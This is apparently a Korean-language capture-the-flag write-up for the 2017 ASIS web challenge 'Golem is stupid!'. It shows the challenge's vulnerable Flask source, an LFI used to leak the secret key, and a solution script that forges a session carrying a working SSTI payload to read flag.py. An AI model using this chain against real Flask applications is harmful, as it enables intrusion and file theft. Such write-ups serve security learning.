# 2017 Asis - [WEB] Golem is stupid!

## Key words

- flask session
- Server Side Template Injection (SSTI)

## Solution

문제에 접속하면 입력 부분이 있고 그 뒤에 article을 보여주는 인자가 존재합니다.

article 부분에서 LFI 가 발생하여 서버 내부 자원에 접근이 가능합니다.

LFI 의 입력으로는 `/proc/self/cmdline` 을 통해 설정 파일의 위치를 알수 있었고, 해당 설정 파일을 다시 읽어 현재 파이썬 파일이 동작하는 위치를 알 수 있었습니다.

해당 파이썬 파일을 보면 다음과 같습니다.

```python
#!/usr/bin/python
import os from flask
import (
    Flask,
    render_template,
    request,
    url_for,
    redirect,
    session,
    render_template_string
)
from flask.ext.session import Session

app = Flask(__name__)
execfile('flag.py')
execfile('key.py')

FLAG = flag
app.secret_key = key

@app.route("/golem", methods=["GET", "POST"])
def golem():
    if request.method != "POST":
        return redirect(url_for("index"))

    golem = request.form.get("golem") or None

    if golem is not None:
        golem = golem.replace(".", "").replace("_", "").replace("{","").replace("}","")

    if "golem" not in session or session['golem'] is None:
        session['golem'] = golem
        template = None

    if session['golem'] is not None:
        template = '''{%% extends "layout.html" %%} {%% block body %%} <h1>Golem Name</h1> <div class="row> <div class="col-md-6 col-md-offset-3 center"> Hello : %s, why you don't look at our <a href='/article?name=article'>article</a>? </div> </div> {%% endblock %%} ''' % session['golem'] print session['golem'] = None return render_template_string(template)

@app.route("/", methods=["GET"])
def index():
    return render_template("main.html")

@app.route('/article', methods=['GET'])
def article():
    error = 0
    if 'name' in request.args:
        page = request.args.get('name')
    else:
        page = 'article'

    if page.find('flag')>=0:
        page = 'notallowed.txt'

    try:
        template = open('/home/golem/articles/{}'.format(page)).read()
    except Exception as e:
        template = e

    return render_template('article.html', template=template) if __name__ == "__main__": app.run(host='0.0.0.0', debug=False)
```

flag.py 가 필터링 되어 있고, key.py는 필터링 되어 있지 않습니다. 해당 파일을 읽으면 secret_key가 노출 되고 해당 키를 이용하여 세션을 생성할 수 있습니다.

플라스크 로직에 golem 으로 입력을 받으면 필터링을 하지만 session['golem']이 존재하면 필터링을 하지 않기 때문에 위에서 얻은 secret_key를 기준으로 golem 키의 세션을 생성하여 SSTI 이 가능합니다.

flask request 모듈을 이용하여 file 함수를 호출 할수 있고 이를 이용하여 flag.py 를 읽을 수 있습니다.

### Solution Code

```
from flask import *
app = Flask(__name__)
app.secret_key = "7h15_5h0uld_b3_r34lly_53cur3d"

@app.route("/")
def index():
    session["golem"] = "{{ request.__class__.__mro__[8].__subclasses__()[40]('flag.py').read() }}"
    return ""

if __name__ == "__main__":
    app.run("0.0.0.0", 8080)
```

위에서 얻은 세션 값을 문제 서버에 전달하면 flag.py를 읽고 출력을 해줍니다.

